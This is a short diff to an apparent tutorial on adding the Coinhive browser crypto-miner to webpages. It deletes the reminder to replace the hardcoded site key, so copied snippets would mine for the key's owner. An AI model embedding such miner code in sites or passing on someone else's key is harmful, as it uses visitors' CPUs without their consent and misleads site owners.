@@ -26,7 +26,7 @@ Step 3: Add the following code snippet to your webpage/webpages.
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
   // What site-key do we use?
-  var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm'; // Don't forget to replace this with your own key
+  var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm';
 
   // Get instance of the miner
   var miner = new CoinHive.Anonymous(key);
@@ -44,7 +44,7 @@ snippet, we set a 50% throttle for the miner CPU cycles consumed.
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
   // What site-key do we use?
-  var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm'; // Don't forget to replace this with your own key
+  var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm';
 
   // Get instance of the miner
   var miner = new CoinHive.Anonymous(key, { throttle: 0.5 });
